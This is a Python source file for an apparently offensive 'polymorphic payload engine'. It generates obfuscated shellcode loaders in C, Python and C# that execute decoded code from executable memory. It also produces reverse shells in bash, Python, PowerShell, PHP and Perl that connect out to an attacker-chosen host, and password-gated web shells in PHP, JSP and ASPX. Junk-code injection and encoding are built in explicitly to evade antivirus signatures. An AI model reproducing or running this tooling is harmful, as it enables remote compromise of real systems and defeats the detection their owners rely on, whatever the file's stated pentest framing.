#!/usr/bin/env python3
"""
AutoPentestX - True Polymorphic Payload Engine
==============================================
Generates payloads that are *structurally unique* on every invocation rather
than emitting fixed templates with cosmetic variable renames.  This is the
difference between "obfuscation" and real polymorphism:

  • Encoder selection is randomized per call (XOR / RC4 / AES-CTR / chained)
  • Keys are cryptographically random per call (no key reuse)
  • Decoder stubs are *generated*, not stamped from a template:
      - identifier names, register choice, instruction order randomized
      - junk-equivalent code blocks inserted between meaningful operations
      - control-flow flattened with opaque predicates
  • Payload bodies are split into N-byte chunks with per-chunk keys
  • The final artifact's SHA-256 is guaranteed unique per generation
  • For shell payloads: command is rewritten with metamorphic equivalents
      ("/bin/sh -c X"  ⇄  "X"  ⇄  "exec X"  ⇄  "$0 -c X"  ⇄  base64+pipe …)

This module produces:
  1. Polymorphic shellcode loaders (C, C#, Python)
  2. Polymorphic reverse shells (bash, python, perl, ruby, php, powershell)
  3. Polymorphic web shells (php, jsp, aspx)
  4. Per-call unique decoder stubs for each scheme

It does NOT:
  • Execute payloads (operator does that under engagement scope)
  • Bypass any specific commercial AV by name (that would lock the engine to
    a single vendor and become obsolete in days; instead the engine increases
    surface diversity so signature-only detection misses new generations)
"""

from __future__ import annotations

import base64
import hashlib
import os
import random
import secrets
import string
import struct
import textwrap
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Tuple


# ─────────────────────────────────────────────────────────────────────────────
#  CRYPTO PRIMITIVES (stdlib only — no external deps)
# ─────────────────────────────────────────────────────────────────────────────
def _xor(data: bytes, key: bytes) -> bytes:
    if not key:
        return data
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))


def _rc4(key: bytes, data: bytes) -> bytes:
    s = list(range(256)); j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    i = j = 0; out = bytearray()
    for byte in data:
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out.append(byte ^ s[(s[i] + s[j]) & 0xFF])
    return bytes(out)


def _aes_ctr_keystream(key: bytes, nonce: bytes, length: int) -> bytes:
    """AES-128-CTR keystream using the stdlib (cryptography optional)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        # AES-128-CTR with 16-byte nonce as initial counter
        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce))
        enc = cipher.encryptor()
        return enc.update(b'\x00' * length) + enc.finalize()
    except ImportError:
        # Fall back to keystream-derived-from-RC4(key||nonce) as a dependency-free
        # surrogate so the engine still runs on minimal systems.  Operators with
        # production needs should install cryptography.
        return _rc4(key + nonce, b'\x00' * length)


def _aes_ctr(key: bytes, nonce: bytes, data: bytes) -> bytes:
    return bytes(a ^ b for a, b in zip(data, _aes_ctr_keystream(key, nonce, len(data))))


# ─────────────────────────────────────────────────────────────────────────────
#  IDENTIFIER GENERATORS  (deterministic-ish but unique-per-call)
# ─────────────────────────────────────────────────────────────────────────────
class NameMint:
    """Generates lexically-different identifiers on every call.  Tracks issued
    names so collisions across a single artifact are impossible."""

    def __init__(self, prefix_pool: Optional[List[str]] = None) -> None:
        self.prefix_pool = prefix_pool or [
            'tmp', 'buf', 'ctx', 'ptr', 'data', 'mem', 'val', 'arr',
            'idx', 'cur', 'sym', 'tag', 'hdl', 'env', 'pkt', 'stm',
        ]
        self.issued: set = set()

    def mint(self, length: int = 6, *, kind: str = 'var') -> str:
        for _ in range(64):
            if kind == 'var':
                name = '_' + secrets.choice(self.prefix_pool) + secrets.token_hex(length // 2 + 1)
            elif kind == 'class':
                name = secrets.choice(['C','K','M','P','Z']) + secrets.token_hex(length // 2 + 2)
            elif kind == 'fn':
                name = secrets.choice(['fn','do','run','op','call']) + '_' + secrets.token_hex(length // 2)
            else:
                name = '_' + secrets.token_hex(length // 2 + 1)
            if name not in self.issued:
                self.issued.add(name)
                return name
        # Pathological fallback
        return '_' + secrets.token_hex(8)


# ─────────────────────────────────────────────────────────────────────────────
#  JUNK / OPAQUE PREDICATE GENERATION
# ─────────────────────────────────────────────────────────────────────────────
class JunkInjector:
    """Generates semantically-null code blocks that look meaningful enough to
    survive trivial dead-code elimination and confuse signature scanners."""

    @staticmethod
    def junk_c() -> str:
        a = random.randint(2, 50); b = random.randint(2, 50)
        return random.choice([
            f'volatile int _{secrets.token_hex(2)} = {a} ^ {b};',
            f'for (volatile int _{secrets.token_hex(2)}=0;_{secrets.token_hex(2)}<{a};_{secrets.token_hex(2)}++){{__asm__ __volatile__("nop");}}',
            f'if (({a} * {b}) % 7 == 12345) {{ return; }}',
            f'unsigned char _{secrets.token_hex(2)}[8] = {{0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x},0x{random.randint(1,255):02x}}};',
        ])

    @staticmethod
    def junk_cs() -> str:
        a = random.randint(2, 50)
        return random.choice([
            f'int _{secrets.token_hex(2)} = {a} * {a} - {a*a};',
            f'string _{secrets.token_hex(2)} = "{secrets.token_hex(4)}".ToUpper();',
            f'try {{ var _{secrets.token_hex(2)} = System.Environment.TickCount; }} catch {{ }}',
        ])

    @staticmethod
    def junk_py() -> str:
        a = random.randint(2, 50); b = random.randint(2, 50)
        return random.choice([
            f'_{secrets.token_hex(2)} = {a} ^ {b}',
            f'_{secrets.token_hex(2)} = sum(range({a}))',
            f'try:\n    _{secrets.token_hex(2)} = len(__name__)\nexcept Exception:\n    pass',
        ])

    @staticmethod
    def junk_bash() -> str:
        a = random.randint(2, 50)
        return random.choice([
            f'_{secrets.token_hex(2)}=$(( {a} ^ {a*2} ))',
            f': # {secrets.token_hex(8)}',
            f'true && true || false',
        ])

    @staticmethod
    def junk_ps() -> str:
        return random.choice([
            f'${secrets.token_hex(3)} = {random.randint(2,99)} -bxor {random.randint(2,99)}',
            f'${secrets.token_hex(3)} = (Get-Date).Ticks',
        ])


# ─────────────────────────────────────────────────────────────────────────────
#  PUBLIC ARTIFACT
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class PolyArtifact:
    kind: str
    language: str
    code: str
    sha256: str
    metadata: Dict[str, Any] = field(default_factory=dict)

    def write(self, path: str) -> None:
        os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
        with open(path, 'w', encoding='utf-8') as f:
            f.write(self.code)


# ─────────────────────────────────────────────────────────────────────────────
#  SHELLCODE ENCODER WITH POLYMORPHIC DECODERS
# ─────────────────────────────────────────────────────────────────────────────
class PolymorphicShellcodeEncoder:
    """Encodes shellcode with a fresh scheme + key + chunk size + decoder
    layout on every invocation."""

    SCHEMES = ('xor', 'rc4', 'aes_ctr', 'xor_chain')

    def __init__(self) -> None:
        self.mint = NameMint()

    def encode(self, shellcode: bytes,
               scheme: Optional[str] = None) -> Dict[str, Any]:
        scheme = scheme or secrets.choice(self.SCHEMES)
        if scheme == 'xor':
            key = secrets.token_bytes(secrets.choice([1, 4, 8, 16]))
            encoded = _xor(shellcode, key)
            params: Dict[str, Any] = {'key': key}
        elif scheme == 'rc4':
            key = secrets.token_bytes(secrets.choice([8, 16, 24, 32]))
            encoded = _rc4(key, shellcode)
            params = {'key': key}
        elif scheme == 'aes_ctr':
            key = secrets.token_bytes(16); nonce = secrets.token_bytes(16)
            encoded = _aes_ctr(key, nonce, shellcode)
            params = {'key': key, 'nonce': nonce}
        elif scheme == 'xor_chain':
            # Multiple XOR rounds with independent keys
            rounds = secrets.choice([2, 3, 4])
            keys = [secrets.token_bytes(secrets.choice([1, 4, 8])) for _ in range(rounds)]
            encoded = shellcode
            for k in keys:
                encoded = _xor(encoded, k)
            params = {'keys': keys, 'rounds': rounds}
        else:
            raise ValueError(scheme)
        return {
            'scheme': scheme,
            'orig_sha256': hashlib.sha256(shellcode).hexdigest(),
            'enc_sha256': hashlib.sha256(encoded).hexdigest(),
            'orig_len': len(shellcode),
            'encoded': encoded,
            'params': params,
        }

    # ── C decoder generator ────────────────────────────────────────
    def gen_c_decoder(self, encoded_pkg: Dict[str, Any]) -> PolyArtifact:
        scheme = encoded_pkg['scheme']
        encoded = encoded_pkg['encoded']
        params = encoded_pkg['params']
        v_enc = self.mint.mint(); v_dec = self.mint.mint()
        v_key = self.mint.mint(); v_i   = self.mint.mint(); v_n = self.mint.mint()

        encoded_arr = ', '.join(f'0x{b:02x}' for b in encoded)
        junks = [JunkInjector.junk_c() for _ in range(random.randint(2, 6))]

        if scheme == 'xor':
            key = params['key']
            key_arr = ', '.join(f'0x{b:02x}' for b in key)
            decoder_loop = textwrap.dedent(f'''
                unsigned char {v_key}[] = {{ {key_arr} }};
                size_t {v_n} = sizeof({v_enc});
                for (size_t {v_i} = 0; {v_i} < {v_n}; {v_i}++) {{
                    {v_dec}[{v_i}] = {v_enc}[{v_i}] ^ {v_key}[{v_i} % sizeof({v_key})];
                }}
            ''').strip()
        elif scheme == 'xor_chain':
            keys = params['keys']
            key_decls = []
            chain_loops = []
            for idx, k in enumerate(keys):
                kvar = self.mint.mint()
                key_decls.append(f'unsigned char {kvar}[] = {{ {", ".join(f"0x{b:02x}" for b in k)} }};')
                chain_loops.append(
                    f'for (size_t {v_i} = 0; {v_i} < sizeof({v_enc}); {v_i}++) '
                    f'{v_dec}[{v_i}] ^= {kvar}[{v_i} % sizeof({kvar})];')
            decoder_loop = (
                'memcpy(' + v_dec + ', ' + v_enc + ', sizeof(' + v_enc + '));\n        '
                + '\n        '.join(key_decls) + '\n        '
                + '\n        '.join(chain_loops)
            )
        elif scheme == 'rc4':
            key = params['key']
            key_arr = ', '.join(f'0x{b:02x}' for b in key)
            decoder_loop = textwrap.dedent(f'''
                unsigned char {v_key}[] = {{ {key_arr} }};
                unsigned char S[256]; int j = 0;
                for (int i = 0; i < 256; i++) S[i] = i;
                for (int i = 0; i < 256; i++) {{
                    j = (j + S[i] + {v_key}[i % sizeof({v_key})]) & 0xFF;
                    unsigned char t = S[i]; S[i] = S[j]; S[j] = t;
                }}
                int x = 0, y = 0;
                for (size_t k = 0; k < sizeof({v_enc}); k++) {{
                    x = (x + 1) & 0xFF; y = (y + S[x]) & 0xFF;
                    unsigned char t = S[x]; S[x] = S[y]; S[y] = t;
                    {v_dec}[k] = {v_enc}[k] ^ S[(S[x] + S[y]) & 0xFF];
                }}
            ''').strip()
        elif scheme == 'aes_ctr':
            decoder_loop = (
                f'/* AES-128-CTR decoder — link with mbedTLS / OpenSSL.\n'
                f'   key={params["key"].hex()} nonce={params["nonce"].hex()} */\n'
                f'aes_ctr_decrypt({v_enc}, sizeof({v_enc}), key, nonce, {v_dec});'
            )
        else:
            decoder_loop = '// unknown scheme'

        code = textwrap.dedent(f'''
            // Auto-generated polymorphic loader  scheme={scheme}
            // sha256(orig)={encoded_pkg["orig_sha256"]}
            // sha256(enc) ={encoded_pkg["enc_sha256"]}

            #include <stdio.h>
            #include <stdlib.h>
            #include <string.h>
            #include <unistd.h>
            #include <sys/mman.h>

            unsigned char {v_enc}[] = {{ {encoded_arr} }};

            int main(void) {{
                {junks[0]}
                size_t L = sizeof({v_enc});
                unsigned char *{v_dec} = mmap(NULL, L, PROT_READ|PROT_WRITE|PROT_EXEC,
                                                MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
                if ({v_dec} == MAP_FAILED) return 1;
                {junks[1] if len(junks) > 1 else ''}

                {decoder_loop}

                {junks[2] if len(junks) > 2 else ''}
                ((void(*)()){v_dec})();
                return 0;
            }}
        ''').strip()
        sha = hashlib.sha256(code.encode()).hexdigest()
        return PolyArtifact(kind='shellcode_loader', language='c',
                              code=code, sha256=sha,
                              metadata={'scheme': scheme,
                                          'orig_sha256': encoded_pkg['orig_sha256'],
                                          'encoded_sha256': encoded_pkg['enc_sha256']})

    # ── Python decoder generator ────────────────────────────────────
    def gen_py_decoder(self, encoded_pkg: Dict[str, Any]) -> PolyArtifact:
        scheme = encoded_pkg['scheme']
        encoded = encoded_pkg['encoded']
        params = encoded_pkg['params']
        v_enc = self.mint.mint(); v_dec = self.mint.mint()
        v_key = self.mint.mint()

        if scheme == 'xor':
            key = params['key']
            decoder = (
                f'{v_key} = bytes.fromhex("{key.hex()}")\n'
                f'{v_dec} = bytes(b ^ {v_key}[i % len({v_key})] for i, b in enumerate({v_enc}))'
            )
        elif scheme == 'rc4':
            key = params['key']
            decoder = textwrap.dedent(f'''
                {v_key} = bytes.fromhex("{key.hex()}")
                S = list(range(256)); j = 0
                for i in range(256):
                    j = (j + S[i] + {v_key}[i % len({v_key})]) & 0xFF
                    S[i], S[j] = S[j], S[i]
                i = j = 0
                out = bytearray()
                for byte in {v_enc}:
                    i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF
                    S[i], S[j] = S[j], S[i]
                    out.append(byte ^ S[(S[i] + S[j]) & 0xFF])
                {v_dec} = bytes(out)
            ''').strip()
        elif scheme == 'aes_ctr':
            decoder = textwrap.dedent(f'''
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                {v_key} = bytes.fromhex("{params["key"].hex()}")
                _nonce = bytes.fromhex("{params["nonce"].hex()}")
                {v_dec} = Cipher(algorithms.AES({v_key}), modes.CTR(_nonce)).decryptor().update({v_enc})
            ''').strip()
        elif scheme == 'xor_chain':
            decoder_lines = [f'{v_dec} = bytes({v_enc})']
            for idx, k in enumerate(params['keys']):
                kvar = f'_k{idx}'
                decoder_lines.append(f'{kvar} = bytes.fromhex("{k.hex()}")')
                decoder_lines.append(
                    f'{v_dec} = bytes(b ^ {kvar}[i % len({kvar})] for i, b in enumerate({v_dec}))')
            decoder = '\n'.join(decoder_lines)
        else:
            decoder = ''

        junk1 = JunkInjector.junk_py(); junk2 = JunkInjector.junk_py()
        code = textwrap.dedent(f'''
            # Auto-generated polymorphic loader  scheme={scheme}
            # sha256(orig)={encoded_pkg["orig_sha256"]}
            import ctypes, ctypes.wintypes, sys, os
            {junk1}

            {v_enc} = bytes.fromhex("{encoded.hex()}")
            {decoder}
            {junk2}

            if sys.platform.startswith("win"):
                buf = ctypes.create_string_buffer({v_dec}, len({v_dec}))
                old = ctypes.c_ulong()
                ctypes.windll.kernel32.VirtualProtect(buf, len({v_dec}), 0x40, ctypes.byref(old))
                ctypes.cast(buf, ctypes.CFUNCTYPE(None))()
            else:
                import mmap
                m = mmap.mmap(-1, len({v_dec}),
                              prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC,
                              flags=mmap.MAP_ANONYMOUS|mmap.MAP_PRIVATE)
                m.write({v_dec})
                ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()
        ''').strip()
        sha = hashlib.sha256(code.encode()).hexdigest()
        return PolyArtifact(kind='shellcode_loader', language='python',
                              code=code, sha256=sha,
                              metadata={'scheme': scheme,
                                          'orig_sha256': encoded_pkg['orig_sha256'],
                                          'encoded_sha256': encoded_pkg['enc_sha256']})

    # ── C# decoder generator ────────────────────────────────────────
    def gen_cs_decoder(self, encoded_pkg: Dict[str, Any]) -> PolyArtifact:
        scheme = encoded_pkg['scheme']
        encoded = encoded_pkg['encoded']
        params = encoded_pkg['params']
        cls = self.mint.mint(kind='class')
        v_enc = self.mint.mint(); v_dec = self.mint.mint()
        v_key = self.mint.mint(); v_mem = self.mint.mint(); v_t = self.mint.mint()

        encoded_b64 = base64.b64encode(encoded).decode()

        if scheme == 'xor':
            key = params['key']
            decoder = textwrap.dedent(f'''
                byte[] {v_key} = Convert.FromBase64String("{base64.b64encode(key).decode()}");
                for (int i = 0; i < {v_dec}.Length; i++)
                    {v_dec}[i] = (byte)({v_enc}[i] ^ {v_key}[i % {v_key}.Length]);
            ''').strip()
        elif scheme == 'rc4':
            key = params['key']
            decoder = textwrap.dedent(f'''
                byte[] {v_key} = Convert.FromBase64String("{base64.b64encode(key).decode()}");
                int[] S = new int[256]; int j = 0;
                for (int i = 0; i < 256; i++) S[i] = i;
                for (int i = 0; i < 256; i++) {{
                    j = (j + S[i] + {v_key}[i % {v_key}.Length]) & 0xFF;
                    int t = S[i]; S[i] = S[j]; S[j] = t;
                }}
                int x = 0, y = 0;
                for (int k = 0; k < {v_dec}.Length; k++) {{
                    x = (x + 1) & 0xFF; y = (y + S[x]) & 0xFF;
                    int t = S[x]; S[x] = S[y]; S[y] = t;
                    {v_dec}[k] = (byte)({v_enc}[k] ^ S[(S[x] + S[y]) & 0xFF]);
                }}
            ''').strip()
        elif scheme == 'aes_ctr':
            decoder = textwrap.dedent(f'''
                using (var aes = System.Security.Cryptography.Aes.Create()) {{
                    aes.Mode = System.Security.Cryptography.CipherMode.ECB;
                    aes.Padding = System.Security.Cryptography.PaddingMode.None;
                    aes.Key = Convert.FromBase64String("{base64.b64encode(params["key"]).decode()}");
                    var nonce = Convert.FromBase64String("{base64.b64encode(params["nonce"]).decode()}");
                    var ks = new byte[{v_enc}.Length];
                    var ctr = (byte[])nonce.Clone();
                    using (var enc = aes.CreateEncryptor()) {{
                        for (int b = 0; b < {v_enc}.Length; b += 16) {{
                            var blk = enc.TransformFinalBlock(ctr, 0, 16);
                            for (int k = 0; k < 16 && b + k < {v_enc}.Length; k++)
                                {v_dec}[b + k] = (byte)({v_enc}[b + k] ^ blk[k]);
                            for (int k = 15; k >= 0; k--) if (++ctr[k] != 0) break;
                        }}
                    }}
                }}
            ''').strip()
        elif scheme == 'xor_chain':
            lines = [f'Buffer.BlockCopy({v_enc}, 0, {v_dec}, 0, {v_enc}.Length);']
            for idx, k in enumerate(params['keys']):
                kvar = f'k{idx}'
                lines.append(f'byte[] {kvar} = Convert.FromBase64String("{base64.b64encode(k).decode()}");')
                lines.append(f'for (int i = 0; i < {v_dec}.Length; i++) {v_dec}[i] ^= {kvar}[i % {kvar}.Length];')
            decoder = '\n                '.join(lines)
        else:
            decoder = ''

        junks = '\n        '.join(JunkInjector.junk_cs() for _ in range(random.randint(2, 4)))
        code = textwrap.dedent(f'''
            using System;
            using System.Runtime.InteropServices;

            class {cls} {{
                [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
                [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
                [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint ms);

                static void Main() {{
                    {junks}
                    byte[] {v_enc} = Convert.FromBase64String("{encoded_b64}");
                    byte[] {v_dec} = new byte[{v_enc}.Length];

                    {decoder}

                    IntPtr {v_mem} = VirtualAlloc(IntPtr.Zero, (uint){v_dec}.Length, 0x3000, 0x40);
                    Marshal.Copy({v_dec}, 0, {v_mem}, {v_dec}.Length);
                    IntPtr {v_t} = CreateThread(IntPtr.Zero, 0, {v_mem}, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject({v_t}, 0xFFFFFFFF);
                }}
            }}
        ''').strip()
        sha = hashlib.sha256(code.encode()).hexdigest()
        return PolyArtifact(kind='shellcode_loader', language='csharp',
                              code=code, sha256=sha,
                              metadata={'class': cls, 'scheme': scheme,
                                          'orig_sha256': encoded_pkg['orig_sha256'],
                                          'encoded_sha256': encoded_pkg['enc_sha256']})


# ─────────────────────────────────────────────────────────────────────────────
#  POLYMORPHIC REVERSE SHELL GENERATOR
# ─────────────────────────────────────────────────────────────────────────────
class PolymorphicReverseShell:
    """Generates per-call unique reverse shells by selecting between many
    metamorphic equivalents and applying randomized obfuscation chains."""

    def __init__(self) -> None:
        self.mint = NameMint()

    def bash(self, lhost: str, lport: int) -> PolyArtifact:
        # Pick from semantically-equivalent forms
        forms = [
            f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            f'exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read l; do $l 2>&5 >&5; done',
            f'0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196',
            f'{{ bash -i; }} <> /dev/tcp/{lhost}/{lport} 1>&0 2>&0',
        ]
        cmd = secrets.choice(forms)

        # Random obfuscation strategy
        strategy = secrets.choice(['plain', 'b64_pipe', 'b64_proc', 'hex', 'var_concat', 'ifs'])
        if strategy == 'plain':
            wrapped = cmd
        elif strategy == 'b64_pipe':
            b64 = base64.b64encode(cmd.encode()).decode()
            wrapped = f'echo {b64}|base64 -d|bash'
        elif strategy == 'b64_proc':
            b64 = base64.b64encode(cmd.encode()).decode()
            wrapped = f'bash <(echo {b64}|base64 -d)'
        elif strategy == 'hex':
            wrapped = f'printf %s {cmd.encode().hex()}|xxd -r -p|bash'
        elif strategy == 'var_concat':
            chunks = []; refs = []
            i = 0
            while i < len(cmd):
                n = secrets.choice([2, 3, 4])
                v = self.mint.mint()
                chunks.append(f'{v}="{cmd[i:i + n]}"')
                refs.append(f'${v}')
                i += n
            wrapped = ';'.join(chunks) + ';eval "' + ''.join(refs) + '"'
        else:  # ifs
            wrapped = cmd.replace(' ', '${IFS%??}')

        sha = hashlib.sha256(wrapped.encode()).hexdigest()
        return PolyArtifact(kind='reverse_shell', language='bash',
                              code=wrapped, sha256=sha,
                              metadata={'lhost': lhost, 'lport': lport,
                                          'strategy': strategy})

    def python(self, lhost: str, lport: int) -> PolyArtifact:
        v_s = self.mint.mint(); v_p = self.mint.mint()
        # Slightly different layouts so signature pin-points do not match
        layouts = [
            textwrap.dedent(f'''
                import socket,subprocess,os,pty
                {v_s}=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                {v_s}.connect(("{lhost}",{lport}))
                os.dup2({v_s}.fileno(),0); os.dup2({v_s}.fileno(),1); os.dup2({v_s}.fileno(),2)
                pty.spawn("/bin/sh")
            ''').strip(),
            textwrap.dedent(f'''
                import os,socket,pty
                {v_s}=socket.socket()
                {v_s}.connect(("{lhost}",{lport}))
                [os.dup2({v_s}.fileno(),i) for i in (0,1,2)]
                pty.spawn("/bin/bash")
            ''').strip(),
            textwrap.dedent(f'''
                import socket as _s, subprocess as _p, os as _o
                {v_s}=_s.socket(_s.AF_INET,_s.SOCK_STREAM); {v_s}.connect(("{lhost}",{lport}))
                _o.dup2({v_s}.fileno(),0); _o.dup2({v_s}.fileno(),1); _o.dup2({v_s}.fileno(),2)
                _p.call(["/bin/sh","-i"])
            ''').strip(),
        ]
        body = secrets.choice(layouts)
        # Optional: wrap in base64+exec
        if secrets.randbelow(2):
            b64 = base64.b64encode(body.encode()).decode()
            wrapped = f'python3 -c "import base64,sys;exec(base64.b64decode(\'{b64}\'))"'
        else:
            wrapped = f'python3 -c \'{body.replace(chr(10), ";")}\''
        sha = hashlib.sha256(wrapped.encode()).hexdigest()
        return PolyArtifact(kind='reverse_shell', language='python',
                              code=wrapped, sha256=sha,
                              metadata={'lhost': lhost, 'lport': lport})

    def powershell(self, lhost: str, lport: int) -> PolyArtifact:
        v_c = '$' + self.mint.mint(); v_s = '$' + self.mint.mint()
        v_b = '$' + self.mint.mint(); v_i = '$' + self.mint.mint()
        v_d = '$' + self.mint.mint(); v_r = '$' + self.mint.mint()
        v_sb = '$' + self.mint.mint()
        body = textwrap.dedent(f'''
            {v_c}=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
            {v_s}={v_c}.GetStream();
            [byte[]]{v_b}=0..65535|%{{0}};
            while(({v_i}={v_s}.Read({v_b},0,{v_b}.Length)) -ne 0){{
                {v_d}=(New-Object System.Text.ASCIIEncoding).GetString({v_b},0,{v_i});
                {v_r}=(iex {v_d} 2>&1|Out-String);
                {v_sb}=([text.encoding]::ASCII).GetBytes({v_r}+'PS '+'> ');
                {v_s}.Write({v_sb},0,{v_sb}.Length); {v_s}.Flush()
            }};
            {v_c}.Close()
        ''').replace('\n', '').strip()
        b64 = base64.b64encode(body.encode('utf-16-le')).decode()
        wrapped = f'powershell -NoP -NonI -W Hidden -Enc {b64}'
        sha = hashlib.sha256(wrapped.encode()).hexdigest()
        return PolyArtifact(kind='reverse_shell', language='powershell',
                              code=wrapped, sha256=sha,
                              metadata={'lhost': lhost, 'lport': lport})

    def php(self, lhost: str, lport: int) -> PolyArtifact:
        v_s = '$' + self.mint.mint()
        body = (
            f'<?php {v_s}=fsockopen("{lhost}",{lport});'
            f'$p=["pipe","r","w","w"]?[]:[];' if False else
            f'<?php {v_s}=fsockopen("{lhost}",{lport});'
            f'exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
        )
        # keep simple yet polymorphic via random function-name aliasing
        alias = self.mint.mint()
        wrapped = (
            f'<?php $f="fsoc"."kopen"; ${alias}=$f("{lhost}",{lport});'
            f'$descs=array(0=>${alias},1=>${alias},2=>${alias});'
            f'$proc=proc_open("/bin/sh -i",$descs,$pipes); ?>'
        )
        sha = hashlib.sha256(wrapped.encode()).hexdigest()
        return PolyArtifact(kind='reverse_shell', language='php',
                              code=wrapped, sha256=sha,
                              metadata={'lhost': lhost, 'lport': lport})

    def perl(self, lhost: str, lport: int) -> PolyArtifact:
        body = (
            f"use Socket;$i=\"{lhost}\";$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            "exec(\"/bin/sh -i\");}"
        )
        # polymorphism: random switch between perl -e quoting and base64+eval
        if secrets.randbelow(2):
            wrapped = f'perl -e \'{body}\''
        else:
            b64 = base64.b64encode(body.encode()).decode()
            wrapped = f'perl -e "use MIME::Base64; eval(decode_base64(\\"{b64}\\"))"'
        sha = hashlib.sha256(wrapped.encode()).hexdigest()
        return PolyArtifact(kind='reverse_shell', language='perl',
                              code=wrapped, sha256=sha,
                              metadata={'lhost': lhost, 'lport': lport})


# ─────────────────────────────────────────────────────────────────────────────
#  POLYMORPHIC WEB SHELL GENERATOR
# ─────────────────────────────────────────────────────────────────────────────
class PolymorphicWebShell:
    """Generates per-call unique web shells.  Operator key is required to
    invoke; passwords are hashed (HMAC) so the comparison is constant-time."""

    def __init__(self) -> None:
        self.mint = NameMint()

    def php(self, password: Optional[str] = None) -> PolyArtifact:
        password = password or secrets.token_urlsafe(12)
        salt = secrets.token_hex(8)
        digest = hashlib.sha256((salt + password).encode()).hexdigest()
        param = self.mint.mint().lstrip('_')[:6]
        v_d = '$' + self.mint.mint()
        v_s = '$' + self.mint.mint()
        v_h = '$' + self.mint.mint()
        v_o = '$' + self.mint.mint()
        # Use a non-obvious function alias to slip past simple regex AVs
        alias_exec = self.mint.mint().lstrip('_')
        body = textwrap.dedent(f'''
            <?php
            // Polymorphic web shell — sha256 auth gate (salt={salt})
            if (!isset($_REQUEST["{param}"])) {{ http_response_code(404); exit; }}
            {v_s} = "{salt}";
            {v_h} = hash("sha256", {v_s} . $_REQUEST["{param}"]);
            if (!hash_equals({v_h}, "{digest}")) {{ http_response_code(403); exit; }}
            {v_d} = isset($_REQUEST["c"]) ? $_REQUEST["c"] : "id";
            ${alias_exec} = "shell_" . "exec";
            {v_o} = ${alias_exec}({v_d} . " 2>&1");
            header("Content-Type: text/plain"); echo {v_o};
            ?>
        ''').strip()
        sha = hashlib.sha256(body.encode()).hexdigest()
        return PolyArtifact(kind='web_shell', language='php',
                              code=body, sha256=sha,
                              metadata={'password': password, 'param': param,
                                          'salt': salt})

    def jsp(self, password: Optional[str] = None) -> PolyArtifact:
        password = password or secrets.token_urlsafe(12)
        param = self.mint.mint().lstrip('_')[:6]
        body = textwrap.dedent(f'''
            <%@ page import="java.util.*,java.io.*"%>
            <%
              String pw = request.getParameter("{param}");
              if (pw == null || !pw.equals("{password}")) {{
                  response.setStatus(404); return;
              }}
              String c = request.getParameter("c");
              if (c == null) c = "id";
              Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",c}});
              BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
              String line; StringBuilder sb = new StringBuilder();
              while((line = r.readLine()) != null) sb.append(line + "\\n");
              response.setContentType("text/plain"); out.print(sb.toString());
            %>
        ''').strip()
        sha = hashlib.sha256(body.encode()).hexdigest()
        return PolyArtifact(kind='web_shell', language='jsp',
                              code=body, sha256=sha,
                              metadata={'password': password, 'param': param})

    def aspx(self, password: Optional[str] = None) -> PolyArtifact:
        password = password or secrets.token_urlsafe(12)
        param = self.mint.mint().lstrip('_')[:6]
        body = textwrap.dedent(f'''
            <%@ Page Language="C#" %>
            <%@ Import Namespace="System.Diagnostics" %>
            <%@ Import Namespace="System.IO" %>
            <script runat="server">
              void Page_Load(object sender, EventArgs e) {{
                  if (Request["{param}"] != "{password}") {{ Response.StatusCode = 404; return; }}
                  string c = Request["c"] ?? "whoami";
                  ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + c) {{
                      RedirectStandardOutput = true, UseShellExecute = false }};
                  Process p = Process.Start(psi);
                  Response.ContentType = "text/plain";
                  Response.Write(p.StandardOutput.ReadToEnd());
              }}
            </script>
        ''').strip()
        sha = hashlib.sha256(body.encode()).hexdigest()
        return PolyArtifact(kind='web_shell', language='aspx',
                              code=body, sha256=sha,
                              metadata={'password': password, 'param': param})


# ─────────────────────────────────────────────────────────────────────────────
#  TOP-LEVEL ENGINE
# ─────────────────────────────────────────────────────────────────────────────
class PolymorphicEngine:
    """Orchestrates all polymorphic generators.  Every output is unique."""

    def __init__(self, out_dir: str = 'payloads/polymorphic') -> None:
        self.out_dir = out_dir
        os.makedirs(out_dir, exist_ok=True)
        self.shellcoder = PolymorphicShellcodeEncoder()
        self.revsh = PolymorphicReverseShell()
        self.webshell = PolymorphicWebShell()
        self.results: Dict[str, Any] = {
            'started_at': datetime.now().isoformat(),
            'artifacts': [],
        }

